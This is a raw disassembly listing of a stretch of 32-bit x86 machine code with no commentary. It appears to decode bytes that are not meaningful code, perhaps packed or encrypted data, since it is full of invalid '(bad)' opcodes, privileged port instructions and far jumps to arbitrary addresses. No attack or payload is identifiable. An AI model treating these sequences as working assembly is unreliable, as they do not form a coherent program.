  4092e0:	aam    0x1a
  4092e2:	jmp    0x3891:0x141d6d4a
  4092e9:	in     al,dx
  4092ea:	iret   
  4092eb:	int3   
  4092ec:	ret    0xb474
  4092ef:	inc    edi
  4092f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092f1:	jno    0x4092fa
  4092f3:	les    edx,FWORD PTR ds:0x4d078729
  4092f9:	hlt    
  4092fa:	mov    BYTE PTR [edi-0x31],al
  4092fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092fe:	push   ebp
  4092ff:	mov    dl,0x90
  409301:	cmp    ah,BYTE PTR [edi+edi*4]
  409304:	in     eax,0x3e
  409306:	test   dl,dl
  409308:	push   eax
  409309:	push   cs
  40930a:	test   BYTE PTR [eax+0x6f],ah
  40930d:	dec    esi
  40930e:	add    ah,dh
  409310:	jns    0x4092e1
  409312:	shl    DWORD PTR [ebx+0x141397fc],1
  409318:	std    
  409319:	ds data16 int 0x32
  40931d:	push   es
  40931e:	fcom   DWORD PTR [esi+0x62ed24a1]
  409324:	pop    esp
  409325:	xchg   edx,eax
  409326:	dec    ebp
  409327:	inc    esi
  409328:	mov    ch,0x21
  40932a:	sbb    BYTE PTR [eax],dh
  40932c:	inc    esp
  40932d:	pop    ds
  40932e:	pop    ebx
  40932f:	sub    ebp,DWORD PTR fs:[edi]
  409332:	xchg   ebp,eax
  409333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409334:	push   0x4498fcbb
  409339:	cmp    esp,ecx
  40933b:	add    cl,cl
  40933d:	fs push esi
  40933f:	jno    0x4092f0
  409341:	mov    ds:0x756a3f80,eax
  409346:	(bad)  
  409347:	test   BYTE PTR fs:[ebx],0x78
  40934b:	push   0xffffffb3
  40934d:	test   DWORD PTR cs:[edi+0x5a],edx
  409351:	add    dh,BYTE PTR [esi]
  409353:	sbb    eax,0xde16a00a
  409358:	stos   DWORD PTR es:[edi],eax
  409359:	xor    eax,0xad2a9a81
  40935e:	mov    dh,0x14
  409360:	mov    dh,0x1b
  409362:	sbb    dl,cl
  409364:	pushf  
  409365:	sub    eax,0xfc799d56
  40936a:	pop    ds
  40936b:	popa   
  40936c:	scas   eax,DWORD PTR es:[edi]
  40936d:	xor    edx,eax
  40936f:	jle    0x4093e3
  409371:	and    esp,DWORD PTR [ecx]
  409373:	aam    0xea
  409375:	jo     0x40931f
  409377:	pop    ss
  409378:	add    ch,BYTE PTR [eax]
  40937a:	sbb    esi,edi
  40937c:	cmp    cl,al
  40937e:	repnz mov al,0x8b
  409381:	jno    0x409331
  409383:	iret   
  409384:	and    esi,DWORD PTR [edx-0x772fd26b]
  40938a:	pop    ds
  40938b:	jbe    0x409341
  40938d:	and    ecx,eax
  40938f:	sub    ebp,edx
  409391:	out    0xec,eax
  409393:	adc    edi,DWORD PTR [ecx]
  409395:	mov    al,ds:0x5a3a3c65
  40939a:	sub    al,0x9c
  40939c:	popf   
  40939d:	arpl   WORD PTR [edx],cx
  40939f:	cdq    
  4093a0:	mov    al,0xde
  4093a2:	daa    
  4093a3:	xchg   ecx,eax
  4093a4:	repnz cdq 
  4093a6:	inc    eax
  4093a7:	icebp  
  4093a8:	pop    ebx
  4093a9:	ja     0x409417
  4093ab:	mov    ecx,DWORD PTR [edi+0x491315ac]
  4093b1:	cdq    
  4093b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093b3:	sbb    ch,BYTE PTR [esi+0x34345699]
  4093b9:	push   0x58
  4093bb:	rol    BYTE PTR [edi],cl
  4093bd:	mov    dh,BYTE PTR [esi]
  4093bf:	test   al,0x5d
  4093c1:	or     bh,ch
  4093c3:	arpl   WORD PTR [eax],cx
  4093c5:	mov    cl,0x5b
  4093c7:	rcr    ah,0x5
  4093ca:	add    eax,0x9a71ec40
  4093cf:	xor    bh,al
  4093d1:	into   
  4093d2:	push   ds
  4093d3:	xchg   edx,eax
  4093d4:	das    
  4093d5:	sbb    eax,edx
  4093d7:	or     BYTE PTR [eax],0xda
  4093da:	sub    BYTE PTR [ebp-0x157ea019],ah
  4093e0:	inc    esi
  4093e1:	out    0xae,eax
  4093e3:	test   ebp,esi
  4093e5:	jmp    0xebf5ec23
  4093ea:	cmp    eax,0x30787043
  4093ef:	sbb    al,BYTE PTR [esi+0x44]
  4093f2:	jl     0x40945c
  4093f4:	xor    esp,esp
  4093f6:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4093f8:	cld    
  4093f9:	jnp    0x4093a6
  4093fb:	fcomi  st,st(5)
  4093fd:	sbb    BYTE PTR [esi+0x6d774d27],bl
  409403:	cdq    
  409404:	or     DWORD PTR [edi-0xf],ecx
  409407:	xor    cl,ah
  409409:	leave  
  40940a:	jmp    0x65e7:0x2fb35060
  409411:	jno    0x40943e
  409413:	mov    ecx,0x7ad59351
  409418:	cmp    eax,0xe3e9907d
  40941d:	fst    DWORD PTR [ecx+0x38f7cf35]
  409423:	mov    ebx,0xbcd33c8a
  409428:	das    
  409429:	addr16 inc esi
  40942b:	jge    0x40944c
  40942d:	mov    fs,WORD PTR [edi]
  40942f:	test   BYTE PTR [edx],ah
  409431:	int3   
  409432:	pop    edi
  409433:	dec    ecx
  409434:	inc    esp
  409435:	rcr    DWORD PTR [esi-0x38],1
  409438:	sub    al,0x2c
  40943a:	or     edi,ebx
  40943c:	sbb    DWORD PTR [ebp-0x5a],ebp
  40943f:	(bad)  
  409440:	aas    
  409441:	aad    0xcf
  409443:	xchg   edx,eax
  409444:	dec    edi
  409445:	popa   
  409446:	inc    ebp
  409447:	sbb    ebx,DWORD PTR [esi]
  409449:	pushf  
  40944a:	aas    
  40944b:	add    BYTE PTR ds:[edi-0x6a],bh
  40944f:	aaa    
  409450:	pop    esi
  409451:	ffree  st(5)
  409453:	test   DWORD PTR [eax+edi*8+0x4d64ec43],eax
  40945a:	cdq    
  40945b:	push   cs
  40945c:	adc    DWORD PTR [ebx-0x5a22d6c5],ebx
  409462:	fdiv   st(2),st
  409464:	repz dec eax
  409466:	mov    dl,0x5f
  409468:	or     eax,0x1a157f28
  40946d:	fnsave [edi]
  40946f:	(bad)  
  409470:	nop
  409471:	rol    BYTE PTR [ebx+0x690816cd],0x3a
  409478:	jae    0x409421
  40947a:	push   esi
  40947b:	mov    ch,0x2a
  40947d:	add    eax,0x60625b21
  409482:	cmp    BYTE PTR [esi],0xe6
  409485:	mov    bh,0x44
  409487:	stc    
  409488:	jae    0x40941d
  40948a:	jg     0x40940f
  40948c:	test   DWORD PTR [ecx+0x3746f28b],eax
  409492:	leave  
  409493:	add    ah,BYTE PTR [edi]
  409495:	fist   DWORD PTR [ebx-0x2df4dd74]
  40949b:	push   ebp
  40949c:	mov    eax,ds:0x99281714
  4094a1:	jp     0x409502
  4094a3:	cs mov ebp,0x63253498
  4094a9:	push   esp
  4094aa:	aad    0x4b
  4094ac:	add    bl,BYTE PTR ds:0x736699a7
  4094b2:	and    DWORD PTR [ebx+0x3c9a0af2],eax
  4094b8:	pop    ds
  4094b9:	inc    edi
  4094ba:	sub    edi,ecx
  4094bc:	int    0x2a
  4094be:	in     al,dx
  4094bf:	add    eax,0xeca06dee
  4094c4:	and    edx,DWORD PTR [ecx]
  4094c6:	dec    ecx
  4094c7:	add    eax,0x6165ce3e
  4094cc:	sbb    ch,ch
  4094ce:	adc    DWORD PTR [ecx-0x79798334],edx
  4094d4:	inc    eax
  4094d5:	cld    
  4094d6:	inc    ebp
  4094d7:	lock shl BYTE PTR [ebx],0x4b
  4094db:	adc    ah,BYTE PTR [esi+0x67b8001b]
  4094e1:	sbb    esi,DWORD PTR ds:0x13a5768c
  4094e7:	mov    ds:0x9a8ae4ea,eax
  4094ec:	mov    ebx,0x389f45b5
  4094f1:	test   DWORD PTR [ebx+0x8],ecx
  4094f4:	lods   al,BYTE PTR ds:[esi]
  4094f5:	sbb    BYTE PTR [esi-0x6fe364af],al
  4094fb:	mov    ah,0x51
  4094fd:	xchg   edi,eax
  4094fe:	pandn  mm2,QWORD PTR [ebx+0x7d]
  409502:	push   cs
  409503:	fisttp DWORD PTR [edx+0x72]
  409506:	sub    DWORD PTR [esi],0x13
  409509:	pop    ecx
  40950a:	bound  esp,QWORD PTR [ebp-0x72a4c7d8]
  409510:	sbb    DWORD PTR [edi+0x3f2105d2],ebx
  409516:	repnz adc al,0x17
  409519:	jg     0x40949d
  40951b:	sub    dl,BYTE PTR cs:[ecx-0x3e]
  40951f:	xor    DWORD PTR [edi+0x357f69ce],ebp
  409525:	and    DWORD PTR [edx-0x7d],edi
  409528:	lds    edx,FWORD PTR [edi-0x6e]
  40952b:	sub    BYTE PTR [ebx-0x7a874d69],cl
  409531:	or     ebp,DWORD PTR gs:[ecx]
  409534:	mov    eax,ds:0x5b113f80
  409539:	jb     0x409504
  40953b:	enter  0xd9e,0x9a
  40953f:	shl    eax,1
  409541:	je     0x40952f
  409543:	repz rcl DWORD PTR [eax-0x62],1
  409547:	adc    al,0xbb
  409549:	jnp    0x4094dd
  40954b:	test   al,0xba
  40954d:	xor    eax,0xd4dcbc61
  409552:	xor    DWORD PTR fs:[esp+edi*1+0x5c6700f5],ebp
  40955a:	stc    
  40955b:	sbb    ebp,esi
  40955d:	fld    DWORD PTR [edi-0x4a]
  409560:	aas    
  409561:	xchg   ecx,eax
  409562:	loop   0x409503
  409564:	add    esi,ebp
  409566:	and    ebx,esi
  409568:	repz push ecx
  40956a:	push   DWORD PTR [ebx]
  40956c:	jb     0x4095bd
  40956e:	xchg   edx,eax
  40956f:	add    DWORD PTR [edi-0x8],ebp
  409572:	xchg   ebp,eax
  409573:	pop    edx
  409574:	cwde   
  409575:	fnstenv [eax]
  409577:	pop    ebp
  409578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409579:	cwde   
  40957a:	(bad)  
  40957c:	enter  0x71fb,0x9d
  409580:	cmp    BYTE PTR [edx],dl
  409582:	or     BYTE PTR [eax+ecx*2+0x8],al
  409586:	in     al,0x68
  409588:	sub    dh,BYTE PTR [edx-0x17]
  40958b:	push   edi
  40958c:	je     0x409554
  40958e:	sub    eax,0xdd86b701
  409593:	(bad)  
  409594:	mov    cl,ah
  409596:	cmp    BYTE PTR [esi+0x3da7c50f],al
  40959c:	jnp    0x40956b
  40959e:	les    ebx,FWORD PTR [ebx+0x4]
  4095a1:	cmp    al,0x4b
  4095a3:	or     dl,ah
  4095a5:	pop    esi
  4095a6:	push   ecx
  4095a7:	fcom   QWORD PTR [eax]
  4095a9:	fsubrp st(0),st
  4095ab:	out    dx,al
  4095ac:	mov    BYTE PTR [eax-0xb],dh
  4095af:	enter  0x2775,0x82
  4095b3:	pop    ecx
  4095b4:	adc    dl,ch
  4095b6:	inc    esi
  4095b7:	adc    dl,BYTE PTR [esi-0x7f]
  4095ba:	(bad)  
  4095bc:	loope  0x40958d
  4095be:	pusha  
  4095bf:	add    bh,BYTE PTR [ebp+0x2152de19]
  4095c5:	test   eax,0x7cde558f
  4095ca:	cmp    DWORD PTR ds:0xe31972a8,esp
  4095d0:	inc    esi
  4095d1:	cmp    al,0x57
  4095d3:	popa   
  4095d4:	push   0xdc82e665
  4095d9:	dec    eax
  4095da:	das    
  4095db:	sbb    bh,BYTE PTR [eax+ebx*4]
  4095de:	push   ds
  4095df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095e1:	clc    
  4095e2:	repnz xor eax,0x7ed749e0
  4095e8:	lock mov bl,0x6
  4095eb:	mov    al,BYTE PTR [eax+0x3d5c1f9]
  4095f1:	loopne 0x409620
  4095f3:	xchg   ebp,eax
  4095f4:	jnp    0x4095b6
  4095f6:	jae    0x409605
  4095f8:	mov    cl,0xdc
  4095fa:	cli    
  4095fb:	dec    edx
  4095fc:	pop    ds
  4095fd:	xchg   edi,eax
  4095fe:	(bad)  
  4095ff:	dec    edi
  409600:	(bad)  
  409601:	aad    0x38
  409603:	or     al,0x3c
  409605:	sbb    BYTE PTR [edi],al
  409607:	xor    BYTE PTR [esi+0x49],cl
  40960a:	ins    DWORD PTR es:[edi],dx
  40960b:	mov    edi,0x8780828d
  409610:	xchg   edx,eax
  409611:	adc    bh,BYTE PTR [edi-0x34b6cae]
  409617:	fld    TBYTE PTR [eax-0xa]
  40961a:	in     al,0x3a
  40961c:	lock xchg DWORD PTR [eax+0x78],ebp
  409620:	and    ah,BYTE PTR gs:[ecx-0x3b36f592]
  409627:	rol    DWORD PTR [ebx-0x5b],0x4d
  40962b:	cs or  esp,esi
  40962e:	lods   al,BYTE PTR ds:[esi]
  40962f:	add    al,0xe8
  409631:	mov    ebx,0x1c930555
  409636:	push   ecx
  409637:	stos   DWORD PTR es:[edi],eax
  409638:	ins    BYTE PTR es:[edi],dx
  409639:	pop    ds
  40963a:	or     eax,0x4e7fbb6a
  40963f:	jbe    0x4095e3
  409641:	xor    DWORD PTR [edi+0x4],0x20006d17
  409648:	fsub   DWORD PTR [esi-0x5d6fb9c5]
  40964e:	popa   
  40964f:	pushf  
  409650:	and    DWORD PTR [edx+esi*2],ebx
  409653:	ins    BYTE PTR es:[edi],dx
  409654:	popa   
  409655:	mov    al,ds:0xfedbe4f3
  40965a:	cmp    DWORD PTR [edx-0x7218a86b],edi
  409660:	ja     0x409608
  409662:	sbb    DWORD PTR [ecx+0x2e39450a],ebx
  409668:	repz rcr DWORD PTR ds:0x2f1cfd9c,0x53
  409670:	jp     0x409684
  409672:	push   0x4f
  409674:	sbb    eax,0x6a74d300
  409679:	push   edx
  40967a:	sbb    bh,bh
  40967c:	(bad)  
  40967d:	pop    esp
  40967e:	cmp    BYTE PTR [ebp-0x2f6e8469],0x7d
  409685:	mov    BYTE PTR [esi-0x3f5c523c],ch
  40968b:	cmp    BYTE PTR [esi-0x719b6300],dl
  409691:	gs pop edx
  409693:	lods   eax,DWORD PTR ds:[esi]
  409694:	pushf  
  409695:	sbb    esi,esi
  409697:	xchg   ebp,eax
  409698:	jge    0x4096d6
  40969a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40969b:	jnp    0x409632
  40969d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40969e:	ss imul edi,ecx,0xf4d6fb2f
  4096a5:	jno    0x409708
  4096a7:	push   ss
  4096a8:	dec    edi
  4096a9:	fild   WORD PTR [ebx-0x56a8f9e1]
  4096af:	lea    ebp,[ecx+esi*4]
  4096b2:	dec    ebx
  4096b3:	sbb    ecx,DWORD PTR [ebp+0x44f096]
  4096b9:	nop
  4096ba:	hlt    
  4096bb:	jg     0x409658
  4096bd:	loopne 0x40967a
  4096bf:	mov    edx,0x80cabdc6
  4096c4:	scas   al,BYTE PTR es:[edi]
  4096c5:	jmp    0x36b2:0x5350fd8b
  4096cc:	xor    bl,ah
  4096ce:	stc    
  4096cf:	and    ecx,DWORD PTR [edi-0x44]
  4096d2:	pop    edx
  4096d3:	dec    esi
  4096d4:	or     DWORD PTR [edi-0x5e],ecx
  4096d7:	jg     0x409731
  4096d9:	lods   eax,DWORD PTR ds:[esi]
  4096da:	cmp    DWORD PTR ds:[eax+0x45],0x2f
  4096df:	push   es
  4096e0:	(bad)  
  4096e1:	and    al,0x9e
  4096e3:	xor    cl,BYTE PTR es:[ecx-0x4aaa5f26]
  4096ea:	aad    0xef
  4096ec:	iret   
  4096ed:	and    BYTE PTR [edx],bh
  4096ef:	push   0x37
  4096f1:	or     BYTE PTR [ecx-0x49d54db1],bl
  4096f7:	inc    ecx
  4096f8:	add    al,BYTE PTR [ecx+0x7d0d72a3]
  4096fe:	xchg   esp,eax
  4096ff:	mov    ebp,0x26987396
  409704:	aas    
  409705:	enter  0xd040,0x2c
  409709:	(bad)  
  40970a:	adc    eax,0xa913c90d
  40970f:	mov    eax,0xf39ed8ff
  409714:	and    BYTE PTR [ebp-0x24],ch
  409717:	lds    ebx,FWORD PTR [ecx]
  409719:	out    0xb1,eax
  40971b:	xchg   DWORD PTR [eax+0x65fd9a27],ebp
  409721:	dec    esi
  409722:	lds    ebp,FWORD PTR [edx+0xa]
  409725:	pop    esp
  409726:	sub    eax,0xda328f53
  40972b:	jmp    0x4b65a890
  409730:	adc    ah,dh
  409732:	xchg   esp,eax
  409733:	das    
  409734:	iret   
  409735:	cmp    DWORD PTR [ebp-0x730dbbb2],ecx
  40973b:	rcr    DWORD PTR [ebp+eiz*2-0x2a],0xe2
  409740:	shl    ebp,0x86
  409743:	xchg   esp,eax
  409745:	mov    al,ds:0xcc33ad6
  40974a:	enter  0x9f97,0x55
  40974e:	(bad)  
  40974f:	pop    eax
  409750:	aaa    
  409751:	or     al,BYTE PTR [edi]
  409753:	das    
  409754:	rcr    BYTE PTR [ecx-0x405d2af8],1
  40975a:	and    bl,BYTE PTR [ecx-0x7d3692dd]
  409760:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  409762:	loope  0x409706
  409764:	shl    DWORD PTR [ebp+ecx*4+0x17],1
  409768:	test   BYTE PTR [edi+eax*4-0x3f7e738],0xeb
  409770:	dec    ebp
  409771:	cli    
  409772:	add    ah,BYTE PTR [esi+0x30201818]
  409778:	jg     0x409784
  40977a:	xor    BYTE PTR [eax-0x2e],dl
  40977d:	pop    eax
  40977e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40977f:	sub    DWORD PTR [ebp+ebp*2+0xe2500d2],ebp
  409786:	sar    DWORD PTR [edi-0x5cccf6d4],1
  40978c:	dec    esp
  40978d:	icebp  
  40978e:	dec    eax
  40978f:	fldcw  WORD PTR [ecx+0x712ec0d2]
  409795:	mov    dh,0xd5
  409797:	xor    al,0x9
  409799:	out    0x3c,eax
  40979b:	xor    ah,bh
  40979d:	mov    eax,0xae19b0bc
  4097a2:	lgs    eax,FWORD PTR [edx-0x31]
  4097a6:	je     0x40980c
  4097a8:	jo     0x409818
  4097aa:	sub    ebx,eax
  4097ac:	mov    ds:0xa83445e1,al
  4097b1:	ins    BYTE PTR es:[edi],dx
  4097b2:	loop   0x409831
  4097b4:	sbb    ah,bl
  4097b6:	mov    bh,0x43
  4097b8:	mov    al,0xed
  4097ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097bb:	jb     0x4097c7
  4097bd:	inc    esi
  4097be:	sbb    cl,BYTE PTR [ebp-0x28]
  4097c1:	idiv   ebp
  4097c3:	jp     0x40974e
  4097c5:	stc    
  4097c6:	stos   BYTE PTR es:[edi],al
  4097c7:	xchg   edx,eax
  4097c8:	mov    ecx,ebx
  4097ca:	call   0xc568:0x902feb37
  4097d1:	inc    edx
  4097d2:	cmc    
  4097d3:	sbb    cl,BYTE PTR [bx-0x29]
  4097d7:	ror    BYTE PTR [ebx],cl
  4097d9:	cmp    eax,0x2816e8b3
  4097de:	out    0x79,al
  4097e0:	dec    ecx
  4097e1:	sbb    al,0x5e
  4097e3:	and    dh,0x49
  4097e6:	stos   DWORD PTR es:[edi],eax
  4097e7:	sbb    edi,ecx
  4097e9:	jbe    0x4097fa
  4097eb:	xor    ah,BYTE PTR [edi]
  4097ed:	inc    ebx
  4097ee:	sbb    bl,BYTE PTR [ebx+0x5a]
  4097f1:	mov    ?,WORD PTR ds:0x7d7428e
  4097f7:	or     BYTE PTR [edx-0x4e],bh
  4097fa:	adc    DWORD PTR [edx-0x52],ebx
  4097fd:	pop    edi
  4097fe:	xchg   ecx,eax
  4097ff:	cmp    edi,esp
  409801:	dec    ebx
  409802:	push   edi
  409803:	fwait
  409804:	jae    0x4097ea
  409806:	add    dl,BYTE PTR [ecx]
  409808:	dec    ebx
  409809:	ins    DWORD PTR es:[edi],dx
  40980a:	sub    al,BYTE PTR [edx-0x39]
  40980d:	loop   0x409825
  40980f:	add    BYTE PTR [ecx+0x32],bh
  409812:	dec    ebx
  409813:	cli    
  409814:	ss xchg esi,eax
  409816:	js     0x4097c5
  409818:	push   eax
  409819:	sar    edi,0x9b
  40981c:	mov    gs,WORD PTR [edi]
  40981e:	push   cs
  40981f:	ret    0xae04
  409822:	pmulhw mm7,mm3
  409825:	into   
  409826:	enter  0x55cb,0x16
  40982a:	cmp    ebx,DWORD PTR [ecx+0x35a9e439]
  409830:	call   0x2d27:0x7eaf3d9d
  409837:	loop   0x409874
  409839:	sbb    ecx,ebx
  40983b:	xor    cl,al
  40983d:	repz xchg esp,eax
  40983f:	test   DWORD PTR [eax-0x6c09fc74],eax
  409845:	fist   DWORD PTR ds:0x78a03d39
  40984b:	sub    al,cl
  40984d:	clc    
  40984e:	jecxz  0x409815
  409850:	jmp    0x8398:0x8a009761
  409857:	aas    
  409858:	or     al,cl
  40985a:	push   ecx
  40985b:	fs mov ch,0xbc
  40985e:	or     al,0x74
  409860:	in     eax,dx
  409861:	and    eax,0xaef8ec56
  409866:	jnp    0x4098b3
  409868:	fidivr WORD PTR [eax+eiz*1]
  40986b:	leave  
  40986c:	push   edx
  40986d:	pop    ecx
  40986e:	inc    edi
  40986f:	push   edi
  409870:	das    
  409871:	out    dx,eax
  409872:	xchg   ebx,eax
  409873:	mov    bl,cl
  409875:	ficomp WORD PTR [edi+eiz*2-0xa2f0515]
  40987c:	pop    edx
  40987d:	jnp    0x4098b6
  40987f:	xor    BYTE PTR [ebx+0x183917c6],ch
  409885:	pop    ebp
  409886:	sbb    ebp,0x581c0171
  40988c:	scas   eax,DWORD PTR es:[edi]
  40988d:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40988f:	lods   eax,DWORD PTR ds:[esi]
  409890:	enter  0xe609,0xf7
  409894:	sub    BYTE PTR [edi],bl
  409896:	fwait
  409897:	imul   esi,ebx,0x56
  40989a:	xchg   edi,eax
  40989b:	xor    DWORD PTR [eax],edx
  40989d:	lock xor edx,DWORD PTR [esi-0xa]
  4098a1:	inc    esp
  4098a2:	pop    edi
  4098a3:	outs   dx,DWORD PTR ds:[esi]
  4098a4:	mov    esi,0xca8393c
  4098a9:	jbe    0x409899
  4098ab:	test   eax,0xcb2a47b9
  4098b0:	pusha  
  4098b1:	mov    dl,0x5
  4098b3:	fst    DWORD PTR [ecx-0x690e4b4f]
  4098b9:	sbb    bl,BYTE PTR [ecx]
  4098bb:	(bad)  
  4098bd:	jae    0x409910
  4098bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098c0:	aas    
  4098c1:	jnp    0x4098cd
  4098c3:	sahf   
  4098c4:	mov    edi,edx
  4098c6:	xchg   edi,eax
  4098c7:	dec    esi
  4098c8:	inc    ebp
  4098c9:	push   cs
  4098ca:	sub    al,0x36
  4098cc:	shr    BYTE PTR [esi+0x61],1
  4098cf:	pop    ebx
  4098d0:	imul   ebp,DWORD PTR [edx-0x37],0x39
  4098d4:	iret   
  4098d5:	mov    ds:0x85c05b66,al
  4098da:	cmc    
  4098db:	jns    0x4098a6
  4098dd:	call   0xff11c78
  4098e2:	adc    al,dl
  4098e4:	cld    
  4098e5:	dec    ebx
  4098e6:	mov    gs,WORD PTR [ecx-0x2a]
  4098e9:	stos   DWORD PTR es:[edi],eax
  4098ea:	or     ch,BYTE PTR [edx+0x190181b8]
  4098f0:	fldcw  WORD PTR [esi-0x6db482fd]
  4098f6:	ja     0x4098bf
  4098f8:	stc    
  4098f9:	mov    ebp,0x98070bf5
  4098fe:	retf   0xabe6
  409901:	rcl    ebx,0x2f
  409904:	mov    dh,0x1
  409906:	mov    bh,0x9b
  409908:	mov    ebx,0x9e52a0a3
  40990d:	(bad)  
  40990e:	mov    esp,0xaf62b259
  409913:	repz test BYTE PTR [edi],0x17
  409917:	jb     0x40991c
  409919:	push   0x7868b0e0
  40991e:	popf   
  40991f:	jmp    FWORD PTR [esi+0x68]
  409922:	in     eax,dx
  409923:	scas   al,BYTE PTR es:[edi]
  409924:	jno    0x409924
  409926:	(bad)  
  409927:	push   cs
  409928:	pop    edi
  409929:	out    dx,eax
  40992a:	hlt    
  40992b:	popa   
  40992c:	xchg   ecx,eax
  40992d:	les    ecx,FWORD PTR [esi]
  40992f:	ret    
  409930:	mov    dh,0x9b
  409932:	stc    
  409933:	addr16 out dx,eax
  409935:	shl    al,cl
  409937:	es iret 
  409939:	int3   
  40993a:	cs hlt 
  40993c:	(bad)  
  40993d:	cmp    BYTE PTR [edi],bh
  40993f:	stos   WORD PTR es:[edi],ax
  409941:	sub    ah,0x77
  409944:	dec    ebx
  409945:	pop    es
  409946:	ficom  WORD PTR [ebx]
  409948:	mov    ds:0xa42e6059,al
  40994d:	stc    
  40994e:	aas    
  40994f:	and    bl,ah
  409951:	sub    al,0xe1
  409953:	int    0xc6
  409955:	push   ds
  409956:	(bad)  
  409957:	jmp    0x409993
  409959:	fwait
  40995a:	ins    DWORD PTR es:[edi],dx
  40995b:	pop    edx
  40995c:	nop
  40995d:	add    eax,0x4e80e5bc
  409962:	pop    es
  409963:	mov    eax,ds:0x659af2b8
  409968:	adc    DWORD PTR [ebx-0x46],0xffffffe5
  40996c:	cmp    cl,BYTE PTR [edx+edx*8]
  40996f:	pop    edi
  409970:	or     eax,0x3aa68f6b
  409975:	scas   eax,DWORD PTR es:[edi]
  409976:	enter  0xfb0,0x81
  40997a:	add    al,0xe1
  40997c:	lock es jns 0x4099e6
  409980:	in     al,0x6c
  409982:	jb     0x409a01
  409984:	pop    ds
  409985:	push   esp
  409986:	add    al,0xf0
  409988:	sbb    eax,0x16e5dbd3
  40998d:	addr16 popa 
  40998f:	cmp    al,0xde
  409991:	jmp    0x409986
  409993:	jmp    0x409981
  409995:	mov    esi,0xb7931f5f
  40999a:	aad    0x7c
  40999c:	mov    ebp,0x4a59348c
  4099a1:	aas    
  4099a2:	push   edi
  4099a3:	nop
  4099a4:	sub    BYTE PTR [ecx+ecx*1+0x9ce7b8f],0x5f
  4099ac:	jo     0x40999b
  4099ae:	shl    dh,cl
  4099b0:	in     eax,dx
  4099b1:	xchg   edi,eax
  4099b2:	retf   0x9c0c
  4099b5:	iret   
  4099b6:	jnp    0x40996c
  4099b8:	stc    
  4099b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099ba:	xor    DWORD PTR [ebx+0x7a011072],edi
  4099c0:	jle    0x409953
  4099c2:	pop    ss
  4099c3:	pop    esp
  4099c4:	mov    ebx,0xb2d6c9d3
  4099c9:	pushf  
  4099ca:	arpl   WORD PTR [ecx],sp
  4099cc:	push   ebx
  4099cd:	stos   BYTE PTR es:[edi],al
  4099ce:	sub    DWORD PTR [ebx-0x1f],ebx
  4099d1:	pop    ebp
  4099d2:	in     al,dx
  4099d3:	mov    eax,ds:0x65d200f5
  4099d8:	push   ss
  4099d9:	mov    ebp,0x5b7abea0
  4099de:	dec    esi
  4099df:	imul   ecx,DWORD PTR [esi+0x11],0x74
  4099e3:	xchg   edi,eax
  4099e4:	outs   dx,DWORD PTR cs:[esi]
  4099e6:	mov    al,ds:0x111dc2f
  4099eb:	lahf   
  4099ec:	imul   BYTE PTR [edi]
  4099ee:	cmp    eax,0xd4f5d72d
  4099f3:	sbb    al,0xe1
  4099f5:	pop    ecx
  4099f7:	into   
  4099f8:	push   edx
  4099f9:	retf   
  4099fa:	jmp    0x96d3:0xd06f76ce
  409a01:	pop    es
  409a02:	dec    ecx
  409a03:	std    
  409a04:	inc    edi
  409a05:	xchg   BYTE PTR [esi+0x7547a3d7],ah
  409a0b:	call   0x4bd699df
  409a10:	mov    ds:0xfe628820,eax
  409a15:	fst    QWORD PTR ds:0x3745fec4
  409a1b:	bound  esp,QWORD PTR [eax+edx*8]
  409a1e:	vpunpcklwd ymm7,ymm4,YMMWORD PTR [eax+0x6a]
  409a23:	iret   
  409a24:	push   edx
  409a25:	repnz ss gs inc edi
  409a29:	pop    ebp
  409a2a:	push   cs
  409a2b:	ret    
  409a2c:	push   eax
  409a2d:	jle    0x409a43
  409a2f:	mov    al,ds:0xc5504c6
  409a34:	pop    edi
  409a35:	sub    ecx,DWORD PTR [edx+ecx*1]
  409a38:	fsubr  st,st(5)
  409a3a:	mov    esp,0x635d23b5
  409a3f:	cdq    
  409a40:	out    0xab,eax
  409a42:	ds sbb bh,cl
  409a45:	push   ecx
  409a46:	sahf   
  409a47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a48:	jne    0x409a93
  409a4a:	push   0xa2529a50
  409a4f:	xor    al,0xbc
  409a51:	dec    edx
  409a52:	push   0xe
  409a54:	mov    eax,0xae426ca6
  409a59:	mov    al,ds:0x4cac2d4a
  409a5e:	push   ebp
  409a5f:	inc    ebp
  409a60:	sbb    edi,DWORD PTR [esi+0x23]
  409a63:	jge    0x409ab5
  409a65:	jae    0x409a69
  409a67:	mov    ah,0x69
  409a69:	adc    al,0x55
  409a6b:	jmp    0x409ae9
  409a6d:	ins    BYTE PTR es:[edi],dx
  409a6e:	and    bl,BYTE PTR [ebp+ecx*8+0x71]
  409a72:	push   ds
  409a73:	loope  0x409a9d
  409a75:	nop
  409a76:	loope  0x409a9f
  409a78:	lods   al,BYTE PTR ds:[esi]
  409a79:	bound  esi,QWORD PTR ds:0x46781383
  409a7f:	mov    eax,0xf0055950
  409a84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a85:	les    esp,FWORD PTR [edi+0x2d]
  409a88:	inc    ebp
  409a89:	mov    dh,0xe9
  409a8b:	test   DWORD PTR [ebx+0x58],0x22295ec5
  409a92:	clc    
  409a93:	(bad)  
  409a94:	fadd   st(4),st
  409a96:	stos   BYTE PTR es:[edi],al
  409a97:	ins    BYTE PTR es:[edi],dx
  409a98:	inc    edi
  409a99:	loop   0x409acc
  409a9b:	popf   
  409a9c:	sbb    al,0x51
  409a9e:	(bad)  
  409a9f:	xchg   esi,eax
  409aa0:	sbb    al,0x4a
